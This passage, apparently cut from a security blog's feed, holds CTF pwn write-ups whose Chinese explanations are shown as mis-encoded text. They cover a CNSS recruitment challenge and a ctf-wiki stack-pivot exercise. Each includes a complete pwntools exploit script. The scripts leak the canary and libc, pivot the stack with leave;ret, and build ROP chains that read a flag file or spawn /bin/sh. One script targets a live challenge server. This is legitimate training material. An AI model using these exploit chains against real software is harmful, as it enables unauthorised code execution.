address</code>ï¼Œæº¢å‡ºä½æ•°ä¸å¤Ÿæ€ä¹ˆè§£å†³ï¼Ÿç°åœ¨æˆ‘çš„æ€è·¯æœ‰ä¸¤ä¸ª</p><ol><li>åˆ©ç”¨<code>one_gadget</code>ä¸€æ¬¡æ€§è·å¾—shellï¼ˆå¯èƒ½æ€§è¾ƒå°ï¼Œå› ä¸ºseccompçš„åŸå› ï¼‰</li><li>ç§»åŠ¨æ ˆå¸§ï¼ŒæŠŠæ ˆå¸§ç§»åŠ¨åˆ°æˆ‘ä»¬èƒ½å†™å…¥çš„åœ°æ–¹ï¼Œä»¥æ­¤æ¥æ„é€ ROP chain</li></ol><p>ä½¿ç”¨<code>one_gadget</code>è¿›è¡Œå°è¯•ï¼Œæ„æ–™ä¹‹ä¸­çš„å¤±è´¥ã€‚ã€‚ROPå¤§å¸ˆçš„é¢˜ç›®æœç„¶æ˜¯ä¸èƒ½å·é¸¡æˆåŠŸçš„ã€‚</p><p>ç§»åŠ¨æ ˆå¸§çš„<code>leave ret</code>åœ¨ç¨‹åºä¸­æ¯”è¾ƒå¸¸ç”¨ï¼Œè¿˜æ˜¯å¾ˆå¥½æ‰¾ï¼ŒåŒæ—¶æˆ‘ä»¬æœ‰ç¨‹åºçš„åŸºåœ°å€ä¹Ÿå°±èƒ½æ‰¾åˆ°æˆ‘ä»¬å†™å…¥çš„åœ°å€ã€‚</p><p>ç¬¬ä¸€æ¬¡çš„è¿”å›åœ°å€å¡«å…¥æ¼æ´ç‚¹çš„ä¸Šæ–¹ï¼Œä¹Ÿæ˜¯ä¸ºäº†åœ¨ç¬¬ä¸€æ¬¡è¯»å…¥æ•°æ®ä¹‹åå†æ¬¡è·å¾—è¯»å…¥æ•°æ®çš„æœºä¼šï¼Œç„¶åç¬¬äºŒæ¬¡è¯»å…¥çš„æ—¶å€™<code>rbp</code>å¡«å…¥æˆ‘ä»¬çš„å¯æ§åœ°å€ï¼Œè¿”å›åœ°å€å¡«å…¥<code>leave ret</code>çš„gadgetã€‚è¿™æ ·åœ¨readä¹‹åä¼šè°ƒç”¨ä¸€æ¬¡<code>leave</code>ï¼Œ<code>ret</code>ä¹‹ååˆä¼šæœ‰ç¬¬äºŒæ¬¡<code>leave</code>æ¥è®©æ ˆå¸§ç§»åŠ¨ã€‚éšåå°±æ˜¯æ— é™é‡å¤ç¬¬äºŒæ¬¡åŠ¨ä½œï¼Œæ¥å®ŒæˆROPã€‚expå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template rop</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'rop'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'rop'</span></span><br><span class="line"><span class="comment">#libc = exe.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    io = remote(<span class="string">'139.9.5.20'</span>, <span class="string">'60607'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(exe.path, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libseccomp.so.2"</span>&#125;)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0xb8</span> * <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">io.sendline(<span class="string">'whz'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">io.sendline(<span class="string">'step_by_step'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'tell me what you say\n'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="number">0xb8</span> * <span class="string">'a'</span> + <span class="string">'\n'</span>)</span><br><span class="line">canary = u64(<span class="string">'\x00'</span> + io.recv(<span class="number">7</span>))</span><br><span class="line">elf_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x1180</span></span><br><span class="line">info(<span class="string">'canary:'</span>+hex(canary))</span><br><span class="line">info(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line"></span><br><span class="line">bss=elf_base+<span class="number">0x00202500</span> <span class="comment">#è¿™é‡Œä¸æ˜¯bssæ®µ ä½†æ˜¯æ˜¯ä¸€æ®µç©ºç™½æ•°æ®åŒºåŸŸ å¯ä»¥ä»»æ„å†™å…¥</span></span><br><span class="line">buf=bss+<span class="number">0x200</span></span><br><span class="line">buf2=buf+<span class="number">0x200</span></span><br><span class="line">file_place=buf2+<span class="number">0x200</span> <span class="comment"># string ./flag\x00</span></span><br><span class="line">buf3=file_place+<span class="number">0x200</span></span><br><span class="line">file_name=<span class="string">'./flag\x00\x00'</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x11e3</span> + elf_base</span><br><span class="line">pop_rbp_ret = <span class="number">0x0b70</span> + elf_base</span><br><span class="line">read_ret = <span class="number">0x1144</span> + elf_base</span><br><span class="line">leave_ret = <span class="number">0x1176</span> + elf_base</span><br><span class="line">read_got = exe.got[<span class="string">'read'</span>] + elf_base</span><br><span class="line">puts_plt = exe.plt[<span class="string">'puts'</span>] + elf_base</span><br><span class="line">read_plt = exe.plt[<span class="string">'read'</span>] + elf_base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0xb8</span> * <span class="string">'b'</span></span><br><span class="line">payload2 += p64(canary)</span><br><span class="line">payload2 += p64(buf)</span><br><span class="line">payload2 += p64(read_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'I will go to sleep\n'</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = p64(pop_rdi_ret)</span><br><span class="line">payload3 += p64(read_got)</span><br><span class="line">payload3 += p64(puts_plt)</span><br><span class="line">payload3 += p64(pop_rbp_ret)</span><br><span class="line">payload3 += p64(file_place + <span class="number">0xc0</span>)</span><br><span class="line">payload3 += p64(read_ret)</span><br><span class="line">payload3 += <span class="number">17</span> * p64(<span class="number">0</span>) <span class="comment"># padding to len=0xb8</span></span><br><span class="line">payload3 += p64(canary)</span><br><span class="line">payload3 += p64(buf - <span class="number">0xc8</span>)</span><br><span class="line">payload3 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload3)</span><br><span class="line">read_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">info(<span class="string">"libc base:"</span> + hex(libc_base))</span><br><span class="line">pop_rsi_ret = <span class="number">0x23e6a</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x1b96</span> + libc_base</span><br><span class="line">open_addr = libc.symbols[<span class="string">'open'</span>] + libc_base</span><br><span class="line"></span><br><span class="line">payload4 = file_name</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(file_place)</span><br><span class="line">payload4 += p64(pop_rsi_ret)</span><br><span class="line">payload4 += p64(<span class="number">0</span>)</span><br><span class="line">payload4 += p64(open_addr)</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(<span class="number">3</span>)</span><br><span class="line">payload4 += p64(pop_rsi_ret)</span><br><span class="line">payload4 += p64(buf3)</span><br><span class="line">payload4 += p64(pop_rdx_ret)</span><br><span class="line">payload4 += p64(<span class="number">0x30</span>)</span><br><span class="line">payload4 += p64(read_plt)</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(buf3)</span><br><span class="line">payload4 += p64(puts_plt)</span><br><span class="line">payload4 += (<span class="number">0xb8</span> - len(payload4))/<span class="number">8</span> * p64(<span class="number">0</span>)</span><br><span class="line">payload4 += p64(canary)</span><br><span class="line">payload4 += p64(file_place)</span><br><span class="line">payload4 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.send(payload4)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹ä¸çŸ¥é“å¦‚ä½•ç¡®å®šELFçš„åŸºåœ°å€ã€‚ã€‚æ±‚åŠ©äº†<code>@Tangent</code>å¾—åˆ°expï¼Œç„¶ååˆ†æä¹‹åæ‰çŸ¥é“æ˜¯å¯ä»¥é€šè¿‡<code>rbp</code>ç›¸å¯¹ä½ç§»æ¥ç¡®å®šã€‚ä¹‹ååœ¨å¤ç°çš„è¿‡ç¨‹ä¸­ä¹Ÿé‡åˆ°è¿‡ä¸€äº›å‘ï¼š</p><ol><li>ç”¨<code>leave ret</code>æ¥ç§»åŠ¨æ ˆå¸§çš„æ—¶å€™è¦æ³¨æ„ç§»åŠ¨ä¹‹åè¦åœ¨ç›®æ ‡åœ°å€å¤šå¡«å……8å­—èŠ‚ï¼Œè¿™æ˜¯å› ä¸º<code>leave</code>è¦<code>pop rbp</code>çš„åŸå› ï¼›</li><li>è¿™é‡Œç”¨çš„libcæ˜¯libc-2.27ï¼Œæˆ‘æœ€å…ˆä½¿ç”¨çš„libc-2.23ï¼Œä¹Ÿæ˜¯æ²¡æœ‰æ³¨æ„é¢˜ç›®çš„æé†’<code>Ubuntu 18.04</code>ï¼›</li><li>è¿˜æœ‰å°±æ˜¯æˆ‘ä¸ºäº†å·æ‡’<code>read</code>è¯»å…¥æ•°æ®çš„åœ°å€ä¸€å¼€å§‹æ˜¯<code>file_name</code>çš„åœ°æ–¹ï¼Œç»“æœå‘ç°è€æ˜¯è¯»å‡ºæ¥çš„æ˜¯ä¹±ç ï¼Œè°ƒè¯•ä¹‹åå‘ç°æ˜æ˜èƒ½æˆåŠŸè¯»å–åˆ°å­—ç¬¦ä¸²ï¼Œç„¶åè°ƒ<code>puts</code>è¾“å‡ºçš„æ—¶å€™è«åå…¶å¦™çš„å°±ä¸è¡Œï¼Ÿï¼Ÿï¼ŸéšåæŠŠè¯»å…¥çš„æ•°æ®æ”¾åœ¨å…¶ä»–åœ°æ–¹å°±å¥½äº†ã€‚ã€‚ã€‚å¦‚æœæœ‰å¤§ä½¬çŸ¥é“æ˜¯æ€ä¹ˆå›äº‹çš„ï¼Œæ±‚å‘ŠçŸ¥ï¼›</li></ol><img src="/2019/11/11/cnss-recruit-pwn-1/4.png"><p>æœ€åæ‹¿åˆ°flagï¼Œ<code>cnss{r00oopp_1s_e45y_I_10v3_r0o00op}</code>ã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CNSSæ‹›æ–°é¢˜ç›®ä¸­æœ‰ä¸¤é“ä¸é”™çš„Pwné¢˜ï¼Œæ‹¿æ¥å­¦ä¹ ä¸€æ³¢çŸ¥è¯†ã€‚ç„¶è€Œå…¶ä¸­æœ‰ä¸€é“æ˜¯å†…æ ¸ROPï¼Œå¤ç°äº†å¥½å‡ å¤©ã€‚ã€‚è¿˜æ˜¯æœ‰ç‚¹é—®é¢˜ï¼Œå†åŠ ä¸Šç ”ç©¶ç”Ÿå¤§ä½œä¸šé›†ç¾¤æ¥äº†ï¼ˆå®Œå…¨ä¸èƒ½æ‘¸é±¼ï¼Œå“­å”§å”§ï¼‰ï¼Œæ‰€ä»¥é‚£é“å†…æ ¸é¢˜èƒ½åšå‡ºæ¥å°±æ”¾åšå®¢ã€‚&lt;/p&gt;
&lt;h2 id=&quot;Sleepy-Server&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="æŠ€æœ¯" scheme="https://hurricane618.me/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
      <category term="ROP" scheme="https://hurricane618.me/tags/ROP/"/>
    
      <category term="stackoverflow" scheme="https://hurricane618.me/tags/stackoverflow/"/>
    
  </entry>
  
  <entry>
    <title>èŠ±å¼æ ˆæº¢å‡ºå­¦ä¹ </title>
    <link href="https://hurricane618.me/2019/09/14/fancy-rop-practice/"/>
    <id>https://hurricane618.me/2019/09/14/fancy-rop-practice/</id>
    <published>2019-09-14T09:50:16.000Z</published>
    <updated>2019-09-14T16:23:11.891Z</updated>
    
    <content type="html"><![CDATA[<p>ç»§ç»­è¿›è¡Œç€æ ˆæº¢å‡ºçš„ç»ƒä¹ ï¼Œè¿™æ¬¡æ˜¯å‚è€ƒäº†ctf-wikiä¸Šé¢çš„æ¼”ç¤ºé¢˜ç›®ï¼Œåœ¨å¤ç°è¿‡ç¨‹ä¸­çš„ä¸€äº›è®°å½•ã€‚</p><h2 id="over"><a href="#over" class="headerlink" title="over"></a>over</h2><p>å®‰æ’æœˆèµ›çš„é¢˜ç›®ï¼Œé¦–å…ˆçœ‹ç¨‹åºä¿æŠ¤ï¼Œå¼€å¯äº†NXï¼Œä¸èƒ½å†™shellcodeï¼ŒåŒæ—¶åˆ†æäº†ç¨‹åºç»“æœå‘ç°bufferæœ‰0x50ï¼Œä½†æ˜¯è¾“å…¥æœ‰0x60ä¹Ÿå°±æ˜¯è¯´åªèƒ½è¦†ç›–rbpå’Œretåœ°å€ï¼Œæ‰€ä»¥å¿…é¡»è¦æ”¹å˜æ ˆçš„ä½ç½®ã€‚</p><p>é¦–å…ˆæ˜¯ä¸€ä¸ªtrickï¼Œé‡Œé¢è¯»å…¥çš„å‡½æ•°æ˜¯<code>read</code>ï¼Œæ‰€ä»¥è¯»å…¥çš„æ•°æ®æ˜¯ä¸ä¼šè‡ªåŠ¨åŠ ä¸Š<code>\0</code>çš„ï¼Œå…¶ä»–çš„ä¸¤ä¸ªå‡½æ•°<code>gets</code>å’Œ<code>scanf</code>éƒ½ä¼šå¯¹è¯»å…¥çš„å­—ç¬¦ä¸²åŠ ä¸Š<code>\0</code>æˆªæ–­ã€‚åˆ©ç”¨è¿™ä¸ªå·®å¼‚æ€§ï¼Œæˆ‘ä»¬åªè¦å¡«å…¥0x50ä¸ªé0æ•°æ®ï¼Œè¿™æ ·<code>puts</code>å°±ä¼šæ‰“å°å‡ºrbpçš„å€¼ã€‚æ³„éœ²å‡ºæ ˆåŸºå€ä¹‹åï¼Œæˆ‘ä»¬å°±èƒ½åˆ©ç”¨ç›¸å¯¹åç§»æ¥ç¡®å®šé¢˜ç›®éšæ„çš„æ ˆåœ°å€ã€‚</p><p>è¿™æ ·æˆ‘ä»¬è¾“å…¥80ä¸ªaï¼Œåœ¨putsçš„åœ°æ–¹ä¸‹æ–­ç‚¹ï¼Œçœ‹çœ‹gdbé‡Œé¢çš„ä¿¡æ¯ã€‚</p><img src="/2019/09/14/fancy-rop-practice/1.png"><p>åœ¨è¾“å‡ºæˆ‘ä»¬æ•°æ®çš„æ—¶å€™rbpçš„å€¼ä¸º<code>0x7fffffffdc20</code>ï¼Œç„¶åè§‚å¯Ÿæˆ‘ä»¬çš„æ ˆé¡¶å¤„çš„åœ°å€ä¸º<code>0x7fffffffdbb0</code>ã€‚æˆ‘ä»¬è¿™é‡Œåˆ©ç”¨çš„æ€è·¯æ˜¯ä¼ªé€ æ ˆå¸§ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æ³„éœ²å‡ºæ¥rbpçš„å€¼é€šè¿‡ä½ç§»å·®æˆ‘ä»¬å°±èƒ½å¾—åˆ°æ ˆçš„èµ·å§‹åœ°å€ã€‚ä¹‹åä¼ªé€ çš„æ ¼å¼å¦‚ä¸‹ï¼š</p><p>| 8å­—èŠ‚fake rbp | éœ€è¦è°ƒç”¨çš„åœ°å€ |â€¦| stack addr | leave ret addr |</p><p>è¿™ç§æŠ€æœ¯æ˜¯é€šè¿‡ä¸¤æ¬¡è°ƒç”¨<code>leave</code>æ¥åŠ«æŒ<code>rsp</code>çš„å€¼ï¼Œä½¿å¾—å®ƒæœ€ç»ˆæŒ‡å‘æˆ‘ä»¬è¦è°ƒç”¨çš„åœ°å€å¤„æ‰§è¡Œ<code>ret</code>ï¼Œé€šè¿‡æ§åˆ¶<code>rsp</code>çš„å€¼æ¥æ§åˆ¶<code>rip</code>ã€‚</p><p>å› ä¸ºå‡½æ•°åœ¨æ­£å¸¸è°ƒç”¨ç»“æŸçš„æ—¶å€™ä¼š<code>leave; ret;</code>ï¼Œè¿™æ ·æˆ‘ä»¬è®¾ç½®çš„<code>stack addr</code>è¦†ç›–äº†åŸå§‹çš„<code>rbp</code>ï¼Œé‚£ä¹ˆ<code>leave</code>ä¸­ä¼š<code>mov rsp, rbpï¼› pop rbp</code>ã€‚<code>rsp</code>ä¼šæˆä¸ºæŒ‡å‘<code>stack addr</code>çš„æŒ‡é’ˆï¼Œç„¶å<code>pop rbp</code>å°†æˆ‘ä»¬ä¼ªé€ çš„å€¼ç»™<code>rbp</code>ã€‚ä½†æ˜¯åœ¨ä¹‹åå†æ¬¡æ‰§è¡Œä¸€æ¬¡<code>leave; ret</code>ï¼Œæˆ‘ä»¬ç°åœ¨çš„<code>rsp</code>å°±ä¼šæŒ‡å‘æˆ‘ä»¬æ„é€ çš„åœ°å€å¤„ï¼Œå°†<code>fake rbp</code>å¡«å…¥<code>rbp</code>ä¸­ï¼Œè¿™ä¹‹åçš„<code>ret</code>å°±ä¼šå°†å¡«å……çš„è°ƒç”¨åœ°å€ä½œä¸ºè¿”å›åœ°å€æ¥å¤„ç†ï¼Œè¿™æ ·å°±æˆåŠŸåŠ«æŒäº†æ§åˆ¶æµ.</p><p>æ‰€ä»¥ä¸Šé¢é‚£å¼ å›¾æˆ‘ä»¬å¾—åˆ°æ³„éœ²å‡ºæ¥çš„<code>rbp</code>çš„å€¼å‡å»0x70å°±æ˜¯æˆ‘ä»¬è¾“å…¥ç¼“å†²åŒºçš„æ ˆé¡¶åœ°å€ã€‚æˆ‘ä»¬æ‹¿åˆ°åœ°å€ä¹‹åä¼ªé€ æ ˆå¸§æ³„éœ²libcçš„åœ°å€ï¼Œç„¶åå†æ¬¡ä¼ªé€ æ ˆå¸§getshellã€‚å…¶ä¸­ç¬¬äºŒæ¬¡æ„é€ çš„æ—¶å€™ï¼Œæ ˆçš„ä½ç½®ä¼šæœ‰ä¸€å®šåç§»ï¼Œéœ€è¦è°ƒè¯•è·å–</p><img src="/2019/09/14/fancy-rop-practice/2.png"><p>ä»ä¸Šå›¾å¯ä»¥çŸ¥é“åœ¨ç¬¬äºŒæ¬¡ä¼ªé€ æ ˆå¸§è¾“å…¥çš„æ—¶å€™æ ˆé¡¶åœ°å€ä¸º<code>0x7fffffffdb80</code>ï¼Œè€Œæˆ‘ä»¬ä¸€å¼€å§‹è·å–çš„æ ˆåœ°å€ä¸º<code>0x7fffffffdbb0</code>ï¼Œç›¸å·®0x30ï¼Œåœ¨æ„é€ çš„æ—¶å€™éœ€è¦ä¿®æ­£ä¸€ä¸‹ã€‚æœ€åç»™å‡ºexpï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template over.over</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'over.over'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'over.over'</span></span><br><span class="line">libc = exe.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    No canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(exe.path)</span><br><span class="line"></span><br><span class="line">leave_ret_addr = <span class="number">0x4006be</span></span><br><span class="line">rdi_ret_addr = <span class="number">0x400793</span></span><br><span class="line">rsi_r15_ret_addr = <span class="number">0x400791</span></span><br><span class="line">rdx_ret_offset = <span class="number">0x1b92</span></span><br><span class="line">vul_addr = <span class="number">0x400676</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">'a'</span> * <span class="number">0x50</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, 'b *0x4006b9\n')</span></span><br><span class="line">pause()</span><br><span class="line">io.send(payload1) <span class="comment"># note the '\n'</span></span><br><span class="line">pause()</span><br><span class="line">stack_addr = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - <span class="number">0x70</span> <span class="comment"># debug and get it</span></span><br><span class="line">success(<span class="string">'stack: &#123;:#x&#125;'</span>.format(stack_addr))</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">'b'</span> * <span class="number">8</span></span><br><span class="line">payload2 += p64(rdi_ret_addr)</span><br><span class="line">payload2 += p64(exe.got[<span class="string">'puts'</span>])</span><br><span class="line">payload2 += p64(exe.plt[<span class="string">'puts'</span>])</span><br><span class="line">payload2 += p64(vul_addr)</span><br><span class="line">payload2 += <span class="string">'c'</span> * (<span class="number">80</span> - len(payload2))</span><br><span class="line">payload2 += p64(stack_addr)</span><br><span class="line">payload2 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">libc.address = u64(io.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">'\0'</span>)) - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">success(<span class="string">'libc address: &#123;:#x&#125;'</span>.format(libc.address))</span><br><span class="line">rdx_ret_addr = libc.address + rdx_ret_offset</span><br><span class="line"><span class="comment">#payload3 = 'c' * 80 debug and get the stack offset 0x30</span></span><br><span class="line">payload3 = <span class="string">'c'</span> * <span class="number">8</span></span><br><span class="line">payload3 += p64(rdi_ret_addr)</span><br><span class="line">payload3 += p64( next(libc.search(<span class="string">"/bin/sh"</span>)))</span><br><span class="line">payload3 += p64(rsi_r15_ret_addr)</span><br><span class="line">payload3 += p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(rdx_ret_addr)</span><br><span class="line">payload3 += p64(<span class="number">0</span>)</span><br><span class="line">payload3 += p64(libc.symbols[<span class="string">'execve'</span>])</span><br><span class="line">payload3 += <span class="string">'d'</span> * (<span class="number">80</span> - len(payload3))</span><br><span class="line">payload3 += p64(stack_addr - <span class="number">0x30</span>)</span><br><span class="line">payload3 += p64(leave_ret_addr)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'&gt;'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload3)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>é‡Œé¢æ¯”è¾ƒå‘çš„åœ°æ–¹æœ‰ä¸¤ä¸ªï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬çš„è¾“å…¥ä¸èƒ½å¸¦<code>\n</code>å›è½¦ï¼Œå› 